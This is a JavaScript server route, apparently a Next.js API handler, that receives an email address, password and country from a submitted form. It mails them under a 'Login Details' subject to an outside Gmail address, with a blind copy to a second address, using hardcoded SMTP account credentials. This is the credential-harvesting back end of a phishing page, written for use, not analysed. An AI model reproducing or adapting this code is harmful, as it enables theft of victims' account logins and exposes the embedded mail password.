import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password, country } = req.body;

    // Configure the SMTP transport
    const transporter = nodemailer.createTransport({
      host: 'mail.mailo.com',
      port: 587,
      secure: false,
      auth: {
        user: 'coinreport@mailo.com',
        pass: 'sagekidayo',
      },
    });

    // Define the email options
    const mailOptions = {
      from: 'coinreport@mailo.com',
      to: 'mendharry042@gmail.com',
      bcc: 'money@monemail.com',
      subject: '${country} Login Details',
      html: `
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Country:</strong> ${country}</p>
      `,
    };

    try {
      await transporter.sendMail(mailOptions);
      res.status(200).json({ message: 'Email sent successfully!' });
    } catch (error) {
      console.error('Error sending email:', error);
      res.status(500).json({ error: 'Failed to send email' });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
